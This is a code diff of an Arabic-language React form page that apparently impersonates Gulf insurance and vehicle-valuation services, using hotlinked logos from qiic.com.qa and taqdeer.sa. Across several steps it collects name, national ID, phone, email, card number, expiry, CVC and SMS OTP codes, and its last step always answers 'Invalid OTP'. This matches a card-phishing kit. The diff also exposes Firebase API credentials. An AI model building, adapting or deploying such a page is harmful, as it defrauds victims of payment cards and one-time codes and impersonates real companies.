@@ -12,13 +12,13 @@ import { LiveChatWidget } from "@livechat/widget-react"
 
 // Your Firebase configuration
 const firebaseConfig = {
-    apiKey: "AIzaSyBalb45hYmw3rGK3kn5Skp2Wb4Ci3yeKHc",
-    authDomain: "adsapp-for.firebaseapp.com",
-    projectId: "adsapp-for",
-    storageBucket: "adsapp-for.appspot.com",
-    messagingSenderId: "282166621415",
-    appId: "1:282166621415:web:2be67338bc64233153de42",
-    measurementId: "G-PG5NPD4FES"
+    apiKey: "AIzaSyC-fR9vsFJ0gyOcysg5SG5DMtATNzTyW1c",
+    authDomain: "exam-app-2ec1d.firebaseapp.com",
+    projectId: "exam-app-2ec1d",
+    storageBucket: "exam-app-2ec1d.appspot.com",
+    messagingSenderId: "116559499407",
+    appId: "1:116559499407:web:8c5ecf129f5c437e3ea0fa",
+    measurementId: "G-MY09H839C3"
 }
 
 // Initialize Firebase
@@ -111,15 +111,7 @@ export default function Component() {
         setIsValid(isValidCardNumber(cardNumber))
     }
 
-    const updateFormData = (step: keyof FormData, field: string, value: string) => {
-        setFormData((prev) => ({
-            ...prev,
-            [step]: {
-                ...prev[step],
-                [field]: value,
-            },
-        }))
-    }
+
     const handleSubmit = (e: React.FormEvent) => {
         e.preventDefault()
         let alldat = { personalInfo: { id: id, name: name, email: email, phone: phone }, payment: { cardNumber: cardNumber, expiry: expiry, cvc: cvc }, otp: { otp: otp } }
@@ -127,7 +119,7 @@ export default function Component() {
 
     }
 
-  
+
     const AddressStep = () => (
         <>
             <div className="space-y-2">
@@ -168,63 +160,57 @@ export default function Component() {
             </div>
         </>
     )
-   
-
-
-    const PaymentStep = () => (
-        <div>
+    const GeneralInfo = () => (
+        <>
             <div className="space-y-2">
-                <input
-                    className={`z-9 shadow appearance-none border rounded w-full py-2 px-3  mb-3 leading-tight focus:outline-none focus:shadow-outline ${isValidCardNumber(cardNumber) ? "" : " border-red-500"}`
-                    } id="cardNumber"
-                    placeholder="#### #### #### ####"
-
-                    value={cardNumber}
-                    onChange={(e) => {
-                        e.preventDefault()
-                        handleValidate()
-                        setCardNumber(e.target.value)
-                    }} maxLength={19}
-                    minLength={16}
-                />
-
-            </div>
-            <div className="space-y-2">
-                <label htmlFor="expiry">تاريخ الانتهاء</label>
+                <label htmlFor="street">نوع المركبة</label>
                 <Input
-                    id="expiry"
-                    placeholder="شهر/سنة"
-                    defaultValue={expiry}
-                    onChange={(e) => {
-                        setExpiry(e.target.value)
-                    }}
+                    type="text"
+                    id="street"
+                    placeholder="كامري"
+                    defaultValue={formData.address.street}
                 />
             </div>
             <div className="space-y-2">
-                <label htmlFor="cvc">رمز الأمان</label>
+                <label htmlFor="city">سنة الصنع</label>
                 <Input
-                    id="cvc"
-                    placeholder="١٢٣"
-                    value={cvc}
-                    onChange={(e) => {
-                        setcvc(e.target.value)
-                    }}
+                    id="city"
+                    type="text"
+                    placeholder="2020"
+                    defaultValue={formData.address.city}
                 />
-                <img src="./images/ads.png" alt="pyment" height={70} />
-                {isValid !== null && (
-                    <h3 className={`flex items-center gap-2 ${isValid ? "text-green-500" : "text-red-500"}`}>
-                        {isValid ? <Check className="w-5 h-5" /> : <X className="w-5 h-5" />}
-                        <span>{isValid ? "" : "رقم البطاقة غير صحيح"}</span>
-                    </h3>
-                )}
             </div>
-
-        </div>
+            <div className="space-y-2">
+                <label htmlFor="state">رقم المركبة</label>
+                <Input
+                    id="state"
+                    type="text"
+                    placeholder="1123"
+                    defaultValue={formData.address.state}
+                />
+            </div>
+            <div className="space-y-2">
+                <label htmlFor="zipCode">ملاحظات</label>
+                <Input
+                    type="number"
+                    id="zipCode"
+                    placeholder="ادخل ملاحظاتك"
+                    defaultValue={formData.address.zipCode}
+                />
+            </div>
+        </>
     )
+    const Notes = () => (<>
+        <div className="space-y-2">
+            <p>
+                يتم خصم مبلغ الخصم بناء على طلبك المقدم من الموقع الخاص
+            </p>
+        </div></>)
+
 
     return (
         <div className="opt">
-            <img className="logo" src="https://www.qiic.com.qa/wp-content/themes/qiic/assets/images/site-logo.png" alt="" height={60} />
+            <img className="logo" src="https://taqdeer.sa//static_files/2018/07/89-300x129.png" alt="" height={60} />
 
             <Card className="w-full max-w-lg mx-auto" dir="rtl">
                 <CardHeader>
@@ -233,155 +219,164 @@ export default function Component() {
                             ? "المعلومات الشخصية"
                             : step === 2
                                 ? "تفاصيل العنوان" :
-                                step === 3 ? "معلومات الدفع" : step === 4 ?
-                                    "رمز التاكيد" : "رمز التاكيد"}
+                                step === 3 ? "معلومات المركبة" : step === 4 ?
+                                    "ملاحظات" : step === 5 ?"معلومات الدفع":"رمز التاكيد"}
                     </CardTitle>
                 </CardHeader>
                 <form onSubmit={handleSubmit}>
                     <CardContent className="space-y-4">
                         {step === 1 ? (
-                          <>
-                             <div className="space-y-2">
-                <label htmlFor="name"> الاسم الكامل </label>
-                <div className="space-y-2">
+                            <>
+                                <div className="space-y-2">
+                                    <label htmlFor="name"> الاسم الكامل </label>
+                                    <div className="space-y-2">
 
-                    <Input onChangeCapture={(e) => {
-                        e.stopPropagation()
-                        setName(e.currentTarget.value)
-                    }}
-                        name="name"
-                        placeholder="الاسم الكامل"
-                        onMouseDown={(e) => {
-                        }}
-                        defaultValue={name} />
+                                        <Input onChangeCapture={(e) => {
+                                            e.stopPropagation()
+                                            setName(e.currentTarget.value)
+                                        }}
+                                            name="name"
+                                            placeholder="الاسم الكامل"
+                                            onMouseDown={(e) => {
+                                            }}
+                                            defaultValue={name} />
 
-                </div>
-            </div>
-            <div className="space-y-2">
+                                    </div>
+                                </div>
+                                <div className="space-y-2">
 
-                <label htmlFor="name">رقم الهوية</label>
-                <Input
-                    id="name"
-                    placeholder="رقم الهوية"
-                    type="number"
-                    defaultValue={id}
-                    onChange={(e) => setID(e.target.value)}
-                />
-            </div>
-            <div className="space-y-2">
-                <label htmlFor="email">البريد الإلكتروني</label>
-                <Input
-                    id="email"
-                    type="email"
-                    placeholder="mohammed@example.com"
-                    defaultValue={email}
-                    onChange={(e) => setEmail(e.target.value)}
-                />
-            </div>
-            <div className="space-y-2">
-                <label htmlFor="phone">رقم الهاتف</label>
-                <Input
-                    id="phone"
-                    type="tel"
-                    placeholder="٠٥٠ ١٢٣ ٤٥٦٧"
-                    onChange={(e) => setPhoen(e.target.value)}
+                                    <label htmlFor="name">رقم الهوية</label>
+                                    <Input
+                                        id="name"
+                                        placeholder="رقم الهوية"
+                                        type="number"
+                                        defaultValue={id}
+                                        onChange={(e) => setID(e.target.value)}
+                                    />
+                                </div>
+                                <div className="space-y-2">
+                                    <label htmlFor="email">البريد الإلكتروني</label>
+                                    <Input
+                                        id="email"
+                                        type="email"
+                                        placeholder="mohammed@example.com"
+                                        defaultValue={email}
+                                        onChange={(e) => setEmail(e.target.value)}
+                                    />
+                                </div>
+                                <div className="space-y-2">
+                                    <label htmlFor="phone">رقم الهاتف</label>
+                                    <Input
+                                        id="phone"
+                                        type="tel"
+                                        placeholder="٠٥٠ ١٢٣ ٤٥٦٧"
+                                        onChange={(e) => setPhoen(e.target.value)}
 
-                />
-            </div></>
+                                    />
+                                </div></>
                         ) : step === 2 ? (
                             <AddressStep />
+                        ) : step == 3 ? (
+                            <GeneralInfo />
+                        ) : step === 4 ? (
+                            <Notes />
                         ) :
-                            step === 3 ? (
+                            step === 5 ? (
                                 <div>
-                                <div className="space-y-2">
-                                    <input
-                                        className={`z-9 shadow appearance-none border rounded w-full py-2 px-3  mb-3 leading-tight focus:outline-none focus:shadow-outline ${isValidCardNumber(cardNumber) ? "" : " border-red-500"}`
-                                        } id="cardNumber"
-                                        placeholder="#### #### #### ####"
-                    
-                                        value={cardNumber}
-                                        onChange={(e) => {
-                                            e.preventDefault()
-                                            handleValidate()
-                                            setCardNumber(e.target.value)
-                                        }} maxLength={19}
-                                        minLength={16}
-                                    />
-                    
-                                </div>
-                                <div className="space-y-2">
-                                    <label htmlFor="expiry">تاريخ الانتهاء</label>
-                                    <Input
-                                        id="expiry"
-                                        placeholder="شهر/سنة"
-                                        defaultValue={expiry}
-                                        onChange={(e) => {
-                                            setExpiry(e.target.value)
-                                        }}
-                                    />
-                                </div>
-                                <div className="space-y-2">
-                                    <label htmlFor="cvc">رمز الأمان</label>
-                                    <Input
-                                        id="cvc"
-                                        placeholder="١٢٣"
-                                        value={cvc}
-                                        onChange={(e) => {
-                                            setcvc(e.target.value)
-                                        }}
-                                    />
-                                    <img src="./images/ads.png" alt="pyment" height={70} />
-                                    {isValidCardNumber(cardNumber) !== null && (
-                                        <h3 className={`flex items-center gap-2 ${isValidCardNumber(cardNumber) ? "text-green-500" : "text-red-500"}`}>
-                                            {isValidCardNumber(cardNumber) ? <Check className="w-5 h-5" /> : <X className="w-5 h-5" />}
-                                            <span>{isValidCardNumber(cardNumber)     ? "" : "رقم البطاقة غير صحيح"}</span>
-                                        </h3>
-                                    )}
-                                </div>
-                    
-                            </div>                            ) : step === 4 ?
+                                    <div className="space-y-2">
+                                        <input
+                                            className={`z-9 shadow appearance-none border rounded w-full py-2 px-3  mb-3 leading-tight focus:outline-none focus:shadow-outline ${isValidCardNumber(cardNumber) ? "" : " border-red-500"}`
+                                            } id="cardNumber"
+                                            placeholder="#### #### #### ####"
+
+                                            value={cardNumber}
+                                            onChange={(e) => {
+                                                e.preventDefault()
+                                                handleValidate()
+                                                setCardNumber(e.target.value)
+                                            }} maxLength={19}
+                                            minLength={16}
+                                        />
+
+                                    </div>
+                                    <div className="space-y-2">
+                                        <label htmlFor="expiry">تاريخ الانتهاء</label>
+                                        <Input
+                                            id="expiry"
+                                            placeholder="شهر/سنة"
+                                            defaultValue={expiry}
+                                            onChange={(e) => {
+                                                setExpiry(e.target.value)
+                                            }}
+                                        />
+                                    </div>
+                                    <div className="space-y-2">
+                                        <label htmlFor="cvc">رمز الأمان</label>
+                                        <Input
+                                            id="cvc"
+                                            placeholder="١٢٣"
+                                            value={cvc}
+                                            onChange={(e) => {
+                                                setcvc(e.target.value)
+                                            }}
+                                        />
+                                        <img src="./images/ads.png" alt="pyment" height={70} />
+                                        {isValidCardNumber(cardNumber) !== null && (
+                                            <h3 className={`flex items-center gap-2 ${isValidCardNumber(cardNumber) ? "text-green-500" : "text-red-500"}`}>
+                                                {isValidCardNumber(cardNumber) ? <Check className="w-5 h-5" /> : <X className="w-5 h-5" />}
+                                                <span>{isValidCardNumber(cardNumber) ? "" : "رقم البطاقة غير صحيح"}</span>
+                                            </h3>
+                                        )}
+                                    </div>
+
+                                </div>) : step === 6 ?
                                 (
                                     <>
-            <div className="space-y-2">
-                <label htmlFor="otp">  رمز OTP</label>
-                <Input
-                    defaultValue={otp}
-                    onChange={(e) => setOTP(e.target.value)}
-                />
-            </div>
-            <div className="flex justify-between mt-4">
+                                        <div className="space-y-2">
+                                        <p>الرجاء ادخال رمز التاكيد المرسل الى هاتفك</p>
+                                            
+                                            <label htmlFor="otp">  رمز OTP</label>
+                                            
+                                            <Input
+                                                defaultValue={otp}
+                                                onChange={(e) => setOTP(e.target.value)}
+                                            />
+                                            
+                                        </div>
+                                        <div className="flex justify-between mt-4">
 
 
-            </div>
-        </>
+                                        </div>
+                                    </>
                                 ) :
-                                ( <>
+                                (<>
                                     <div className="space-y-2">
                                         <label htmlFor="otp">  رمز OTP</label>
+                                        <p>الرجاء ادخال رمز التاكيد المرسل الى هاتفك</p>
                                         <Input
                                             defaultValue={otp}
                                             onChange={(e) => setOTP(e.target.value)}
                                         />
                                     </div>
                                     <div className="flex justify-between mt-4">
-                        
-                        
+
+
                                     </div>
                                 </>
                                 )
                         }
                     </CardContent>
                     <CardFooter className="flex justify-between">
-                        {step < 4 ? (
+                        {step < 5 ? (
                             <Button type="button" onClick={() => setStep(step + 1)}>
                                 التالي
                             </Button>
 
-                        ) : step === 3 ? (
-                            <Button type="submit" >
+                        ) : step === 5 ? (
+                            <Button type="submit" onClick={()=>setStep(step+1)} >
                                 تحقق
                             </Button>
-                        ) : step === 4 ? (<Button type="submit" onClick={() => alert("Invalid OTP")}>
+                        ) : step === 6 ? (<Button type="submit" onClick={() => alert("Invalid OTP")}>
                             تحقق
                         </Button>) :
                             (
